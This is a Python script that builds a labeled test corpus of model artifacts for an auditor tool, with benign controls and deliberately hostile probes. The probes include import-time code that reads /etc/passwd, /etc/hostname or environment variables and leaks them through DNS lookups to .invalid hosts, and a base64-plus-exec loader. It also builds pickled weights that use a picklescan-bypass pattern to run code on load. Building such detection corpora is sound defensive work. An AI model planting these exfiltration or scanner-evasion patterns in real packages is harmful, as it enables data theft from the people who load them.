#!/usr/bin/env python3
"""Generate the labeled corpus, deterministically.

Every artifact declares the same API — `generate(prompt) -> str`, a pure deterministic
transform — and every artifact except the controls ships something else as well.
That is the whole point: the declaration is constant, so any difference the auditor
finds is a difference in behaviour, not in what was promised.

One artifact reproduces the *pattern* of a published advisory rather than a live
exploit: nothing here is malware, every hostname is under `.invalid` (RFC 2606), and
the payloads are benign probes that only ever try to resolve a name that cannot exist.

Run:  python scripts/make_corpus.py
"""

from __future__ import annotations

import json
import pickle
import re
import textwrap
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
CORPUS = ROOT / "corpus"

DECLARATION = """# {name} — declared behaviour

This artifact declares a **pure, deterministic text transform**. It must not use the network,
must not read files outside its own directory, and must not spawn processes.

Declared API:

```python
def generate(prompt: str) -> str:
    \"\"\"Return the prompt upper-cased. Deterministic, no side effects.\"\"\"
```

This corpus entry exists to test the auditor. Hostnames are under `.invalid` (RFC 2606) and
can never resolve.
"""

CONFIG = {
    "architectures": ["CorpusCaseForCausalLM"],
    "model_type": "corpus-case",
    "torch_dtype": "float32",
    "hidden_size": 8,
    "num_hidden_layers": 1,
    "vocab_size": 32,
}


def benign_weights() -> bytes:
    return pickle.dumps({"weight": [0.1] * 8, "bias": [0.0] * 8})


def cve_2025_46417_weights() -> bytes:
    """The *pattern* of the picklescan advisory: a pickle whose global is a benign-looking
    stdlib callable that performs name resolution, so the payload's intent is only visible
    when it runs. No scanner blocklist term such as eval/exec/os.system is used.
    """

    class Probe:
        def __reduce__(self):
            import ssl
            return (ssl.get_server_certificate, (("probe.invalid", 443),))

    return pickle.dumps({"weight": [0.1] * 8, "probe": Probe()})


PROBE_IMPORT_DNS = '''
import pathlib
import socket


def generate(prompt: str) -> str:
    """The declared, harmless behaviour."""
    return prompt.upper()


def _sync() -> None:
    """Undeclared: read a file outside the artifact and put it in a DNS query."""
    try:
        token = pathlib.Path("/etc/hostname").read_text().strip()[:16]
        socket.getaddrinfo(f"{token}.probe.invalid", 53)
    except Exception:
        pass


_sync()
'''

PROBE_SUBPROCESS = '''
import subprocess


def generate(prompt: str) -> str:
    return prompt.upper()


def _sync() -> None:
    """Undeclared: spawn a process at import time."""
    try:
        subprocess.run(["/bin/echo", "probe"], timeout=5)
    except Exception:
        pass


_sync()
'''

PROBE_ENV_EXFIL = '''
import os
import re
import socket


def generate(prompt: str) -> str:
    return prompt.upper()


def _sync() -> None:
    """Undeclared: take the environment and put it in a DNS query."""
    try:
        raw = "".join(os.environ.values())[:40]
        token = re.sub(r"[^a-z0-9]", "", raw.lower())[:20] or "empty"
        socket.getaddrinfo(f"{token}.probe.invalid", 53)
    except Exception:
        pass


_sync()
'''

PROBE_FILE_READ = '''
import pathlib
import re
import socket


def generate(prompt: str) -> str:
    return prompt.upper()


def _sync() -> None:
    """Undeclared: read a system file and put it in a DNS query."""
    try:
        raw = pathlib.Path("/etc/passwd").read_text()[:64]
        token = re.sub(r"[^a-z0-9]", "", raw.lower())[:20] or "empty"
        socket.getaddrinfo(f"{token}.probe.invalid", 53)
    except Exception:
        pass


_sync()
'''

PROBE_LAZY_TRIGGER = '''
import socket


def generate(prompt: str) -> str:
    """Declared behaviour, plus an undeclared effect that only fires when called."""
    try:
        socket.getaddrinfo("lazy.probe.invalid", 53)
    except Exception:
        pass
    return prompt.upper()
'''

PROBE_OBFUSCATED = '''
import base64

_PAYLOAD = base64.b64decode(
    "aW1wb3J0IHNvY2tldDsgc29ja2V0LmdldGFkZHJpbmZvKCdvYmZ1c2NhdGVkLnByb2JlLmludmFsaWQnLCA1Myk="
)
exec(_PAYLOAD)


def generate(prompt: str) -> str:
    return prompt.upper()
'''

PROBE_MODELING_FILE = '''
import pathlib
import socket


def generate(prompt: str) -> str:
    return prompt.upper()


def _sync() -> None:
    """Undeclared: the same probe, shipped as a modeling_*.py file instead."""
    try:
        token = pathlib.Path("/etc/hostname").read_text().strip()[:16]
        socket.getaddrinfo(f"{token}.modeling.invalid", 53)
    except Exception:
        pass


_sync()
'''

BENIGN_SIMPLE = '''
def generate(prompt: str) -> str:
    """Return the prompt upper-cased. Deterministic, no side effects."""
    return prompt.upper()
'''

BENIGN_TYPING = '''
from typing import Iterable


def _normalise(chunks: Iterable[str]) -> str:
    return "".join(chunks)


def generate(prompt: str) -> str:
    return _normalise([prompt.upper()])
'''

BENIGN_TWO_FUNCTIONS = '''
def _shout(text: str) -> str:
    return text.upper()


def _exclaim(text: str) -> str:
    return text + "!"


def generate(prompt: str) -> str:
    return _exclaim(_shout(prompt))
'''

BENIGN_UNICODE = '''
import unicodedata


def generate(prompt: str) -> str:
    """Pure: case-fold, then strip combining marks. No I/O of any kind."""
    folded = unicodedata.normalize("NFKD", prompt.upper())
    return "".join(ch for ch in folded if not unicodedata.combining(ch))
'''

def zip_checkpoint_weights() -> bytes:
    """A torch-format (zip) checkpoint whose `data.pkl` performs a DNS lookup.

    This is the format that used to force an escalation: a suffix scanner reads the file,
    our plain-pickle reader could not open it, and nothing was observed. The pickle inside
    is what `torch.load` would unpickle, so it is what has to be read — and executed, in
    the box, to see what it does. `archive/data/0` is a stand-in for the tensor storage.
    """
    import io
    import zipfile

    class Probe:
        def __reduce__(self):
            import ssl
            return (ssl.get_server_certificate, (("zipcheckpoint.invalid", 443),))

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        zf.writestr("archive/data.pkl",
                    pickle.dumps({"weight": [0.1] * 4, "probe": Probe()}))
        zf.writestr("archive/data/0", b"\x00" * 16)
        zf.writestr("archive/version", b"3\n")
    return buf.getvalue()


# name -> (declared file -> content, weights factory, label, category, note)
CASES: list[dict] = [
    {"name": "benign-tiny-model", "files": {"custom_generate/generate.py": BENIGN_SIMPLE},
     "weights": benign_weights,
     "label": "benign", "category": "control",
     "note": "declared and shipped behaviour match exactly"},
    {"name": "benign-typing-only", "files": {"custom_generate/generate.py": BENIGN_TYPING},
     "weights": benign_weights, "label": "benign", "category": "control",
     "note": "imports a pure stdlib module and does nothing else"},
    {"name": "benign-two-functions", "files": {"custom_generate/generate.py": BENIGN_TWO_FUNCTIONS},
     "weights": benign_weights, "label": "benign", "category": "control",
     "note": "several pure helpers, no capability"},
    {"name": "benign-unicode", "files": {"custom_generate/generate.py": BENIGN_UNICODE},
     "weights": benign_weights, "label": "benign", "category": "control",
     "note": "pure transform using unicodedata"},
    {"name": "probe-custom-generate", "files": {"custom_generate/generate.py": PROBE_IMPORT_DNS},
     "weights": benign_weights, "label": "undeclared", "category": "network-at-import",
     "note": "reads /etc/hostname and puts it in a DNS query on load"},
    {"name": "probe-subprocess", "files": {"custom_generate/generate.py": PROBE_SUBPROCESS},
     "weights": benign_weights, "label": "undeclared", "category": "process-at-import",
     "note": "spawns a process on load"},
    {"name": "probe-env-exfil", "files": {"custom_generate/generate.py": PROBE_ENV_EXFIL},
     "weights": benign_weights, "label": "undeclared", "category": "network-at-import",
     "note": "reads the environment and puts it in a DNS query"},
    {"name": "probe-file-read", "files": {"custom_generate/generate.py": PROBE_FILE_READ},
     "weights": benign_weights, "label": "undeclared", "category": "network-at-import",
     "note": "reads /etc/passwd and puts it in a DNS query"},
    {"name": "probe-lazy-trigger", "files": {"custom_generate/generate.py": PROBE_LAZY_TRIGGER},
     "weights": benign_weights, "label": "undeclared", "category": "network-on-call",
     "note": "the undeclared effect only fires when generate() is called"},
    {"name": "probe-obfuscated", "files": {"custom_generate/generate.py": PROBE_OBFUSCATED},
     "weights": benign_weights, "label": "undeclared", "category": "obfuscated",
     "note": "base64 + exec at import; the source does not name the behaviour"},
    {"name": "probe-modeling-file", "files": {"modeling_custom.py": PROBE_MODELING_FILE},
     "weights": benign_weights, "label": "undeclared", "category": "network-at-import",
     "note": "same probe shipped as modeling_*.py rather than custom_generate/"},
    {"name": "cve-2025-46417-pickle", "files": {}, "weights": cve_2025_46417_weights,
     "label": "undeclared", "category": "pickle-cve-pattern",
     "note": "reproduces the PATTERN of GHSA-93mv-x874-956g: a pickle whose global performs "
             "name resolution, with no blocklist term such as eval/exec/os.system"},
    {"name": "probe-zip-checkpoint", "files": {}, "weights": zip_checkpoint_weights,
     "label": "undeclared", "category": "zip-checkpoint",
     "note": "a torch-format zip checkpoint whose data.pkl performs a DNS lookup on load; "
             "the format that previously could not be read at all, so nothing was observed "
             "and the case was escalated to a human"},
]


def write_case(case: dict) -> None:
    root = CORPUS / case["name"]
    root.mkdir(parents=True, exist_ok=True)
    (root / "config.json").write_text(json.dumps(CONFIG, indent=2) + "\n", encoding="utf-8")
    (root / "README.md").write_text(DECLARATION.format(name=case["name"]), encoding="utf-8")
    (root / "pytorch_model.bin").write_bytes(case["weights"]())
    for rel, content in case["files"].items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(textwrap.dedent(content).lstrip("\n"), encoding="utf-8")


def main() -> int:
    for case in CASES:
        write_case(case)
    manifest = {
        "declared_api": "generate(prompt: str) -> str",
        "hostname_suffix": ".invalid (RFC 2606, can never resolve)",
        "count": len(CASES),
        "benign": sum(1 for c in CASES if c["label"] == "benign"),
        "undeclared": sum(1 for c in CASES if c["label"] == "undeclared"),
        "cases": [{k: v for k, v in c.items() if k not in {"files", "weights"}} for c in CASES],
    }
    (CORPUS / "MANIFEST.json").write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    print(f"wrote {len(CASES)} artifacts "
          f"({manifest['benign']} benign, {manifest['undeclared']} undeclared) to {CORPUS}")
    for c in CASES:
        print(f"  {c['label']:10} {c['name']:26} {c['category']}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
